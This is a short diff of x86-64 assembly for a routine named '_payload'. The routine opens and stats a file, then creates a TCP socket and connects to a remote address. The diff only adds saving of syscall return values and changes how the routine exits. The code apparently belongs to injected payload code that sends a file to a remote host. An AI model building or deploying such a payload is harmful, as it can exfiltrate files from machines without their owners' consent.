@@ -46,6 +46,7 @@ _payload:
     lea rdi, [path]
     mov rsi, 0 ; O_RDONLY
     syscall
+	mov r10, rax
     test rax, rax
     js error_open
 
@@ -56,6 +57,7 @@ _payload:
     lea rdi, [path]
     lea rsi, [stat_buffer]
     syscall
+	mov r10, rax
     test rax, rax
     js error_stat
 
@@ -65,6 +67,7 @@ _payload:
     mov rsi, 1 ; SOCK_STREAM
     mov rdx, 0
     syscall
+	mov r10, rax
     test rax, rax
     js error_socket
 
@@ -76,6 +79,7 @@ _payload:
     lea rsi, [sockaddr_in]
     mov rdx, 16 ; Taille de sockaddr_in
     syscall
+	mov r10, rax
     test rax, rax
     js error_connect
 
@@ -90,9 +94,9 @@ _payload:
     mov rax, 3 ; SYS_close
     mov rdi, r13
     syscall
+	mov r10, rax
 
-    leave
-    ret
+    jmp exit
 
 error_open:
     ; Gestion de l'erreur
@@ -119,5 +123,6 @@ exit:
     ; mov rax, 60
     ; xor rdi, rdi
     ; syscall
+	mov rax, r10
 	leave
     ret
